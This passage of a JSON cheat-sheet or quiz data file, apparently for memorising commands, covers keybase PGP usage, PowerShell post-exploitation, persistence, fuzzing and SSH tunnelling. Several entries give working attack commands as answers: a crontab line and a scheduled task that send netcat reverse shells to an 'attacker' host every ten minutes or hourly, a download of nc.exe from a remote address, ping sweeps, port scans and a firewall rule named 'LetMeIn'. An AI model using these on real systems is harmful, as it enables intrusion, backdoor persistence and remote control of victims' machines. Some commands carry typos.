pgp encrypted file to stdout"},{"command":"keybase pgp decrypt -i foo.txt.asc -o foo.txt","comment":"Decrypt pgp to file"},{"command":"keybase pgp sign -m \"hello\"","comment":"PGP sign a message"},{"command":"keybase pgp sign --clearsign -m \"hello\"","comment":"PGP sign a message, but don't encode contents"},{"command":"keybase pgp sign -i test.txt --detatched","comment":"Sign a file, output just the signature."},{"command":"keybase pgp verify -i foo.txt","comment":"PGP verify self-signed file"},{"command":"keybase pgp verify -d foo.txt.asc -i foo.txt","comment":"PGP verify file + detatched signature"}],"tags":[],"platform":""},{"name":"windows/powershell/post-exploitation","questions":[{"question":"Do a ping sweep of the network 10.10.10.0/24 in Powershell.","answer":"1..255 | % {echo \"10.10.10.$_\"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}"},{"question":"How would you port scan the address 1.2.3.4 using only Powershell?","answer":"1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"1.2.3.4\", $_)) \"Port $_ is open\"} 2>$null"},{"question":"How would you fetch the file nc.exe from address 1.2.3.4 using only Powershell?","answer":"(New-Object System.Net.WebClient).DownloadFile(\"http://1.2.3.4/nc.exe\", \"nc.exe\")"},{"question":"List hotfixes in Windows using Powershell.","answer":"Get-HotFix"},{"question":"List programs set to start automatically in Windows using Powershell.","answer":"Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run"},{"question":"Convert the string \"hello\" from ASCII to Base64 in Powershell.","answer":"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"hello\"))"},{"question":"How do you get all the Windows Firewall rules using only Powershell?","answer":"Get-NetFirewallRule -all"},{"question":"Allow address 1.2.3.4 inbound in the firewall using Powershell. Name the rule 'LetMeIn'","answer":"New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 1.2.3.4"}],"commands":[{"command":"1.255 | % {echo \"10.10.10.$_; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}","comment":"Ping sweep"},{"command":"1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"10.10.10.10\", $_)) \"Port $_ is open!\"} 2>$null","comment":"Port scan"},{"command":"(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/nc.exe\", \"nc.exe\")","comment":"Fetch a file via HTTP (like wget)"},{"command":"Get-HotFix","comment":"Get a list of Microsoft Hotfixes"},{"command":"cd HKLM:\\","comment":"Navigate to Windows registry"},{"command":"Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run","comment":"List programs set to start automatically in the registry"},{"command":"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"PS for the win!\"))","comment":"Convert string form ASCII to Base64"},{"command":"Get-NetFirewallRule -all","comment":"Get Firewall rules"},{"command":"New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25","comment":"Create/modify a rule"}],"tags":[],"platform":""},{"name":"linux/hack/persistence","questions":[{"question":"Add 10 minute callback to attacker at 1.2.3.4 on port 777 using bash in Linux.","answer":"echo \"0-59/10 * * * * nc 1.2.3.4 777 -e /bin/bash\" >> /etc/crontab"}],"commands":[{"command":"0-59/10 * * * * nc <IP> 777 -e /bin/bash","comment":"Crontab - set to callback to attacker's IP every 10 minutes with bash via netcat (to reassure)"}],"tags":[],"platform":""},{"name":"windows/hack/persistence","questions":[{"question":"Create a scheduled task to throw a callback shell to 1.2.3.4 on port 777 every hour in CMD and Powershell","answer":"SCHTASKS /Create /SC Hourly /TN hacked /TR \"nc 1.2.3.4 777 -e cmd.exe\""}],"commands":[{"command":"nc <IP> <PORT> -e cmd.exe","comment":"Netcat Callback/reverse shell. Run on victim's machine"}],"tags":[],"platform":""},{"name":"fuzzing/AFL","questions":[],"commands":[{"command":"Step 1.)","comment":"Fork"},{"command":"Step 2.)","comment":"Load and keep in shared memory. Stopping at main()"},{"command":"Step 3.)","comment":"Cycle seed files through looking for crash, hangs, or new paths."},{"command":"NOTE","comment":"1 cycle equals one path with all seed files."},{"command":"NOTE","comment":"Only really handles files and stin. Kernel and OS level fuzzing ins being developed."}],"tags":[],"platform":""},{"name":"linux/ssh/advanced","questions":[{"question":"Perform a forward SSH tunnel from local port 33 to remote server 1.1.1.1 on remote port 55 for user 'frank' at server 'machine'","answer":"ssh -L 33:1.1.1.1:55 frank@machine"},{"question":"Preform a reverse SSH tunnel to local host 1.2.3.4 on remote port 1000 to local port 5000 for user 'frank' at server hostname 'machine'","answer":"ssh -R 1000:1.2.3.4:5000 frank@machine"}],"commands":[{"command":"ssh -L <LOCAL_PORT>:<REMOTE_IP>:<REMOTE_PORT> <USER>@<SERVER>","comment":"Forward Tunnel: map port from remote machine/network on local machine"},{"command":"ssh -R <REMOTE_PORT>:<LOCAL_IP>:<LOCAL_PORT> <USER>@<SERVER>","comment":"Reverse Tunnel: make local port accessable to remote machine"}],"tags":[{"tag":"ssh","none":"asdf"},{"tag":"linux","none":"asdf"},{"tag":"post-exploitation","none":"adsf"}],"platform":""},{"name":"windows/powershell/misc","questions":[{"question":"Lift all Windows API restrictions in Powershell.","answer":"$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\""},{"question":"Limit Powershell commands to \"Constrained Language\"","answer":"$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\""}],"commands":[{"command":"$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\"","comment":"Allow all commands in Powershell (no restrictions to Windows API)"},{"command":"$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"","comment":"Swtich Powershell Language Mode to \"Constrained Language\""}],"tags":[],"platform":""}]}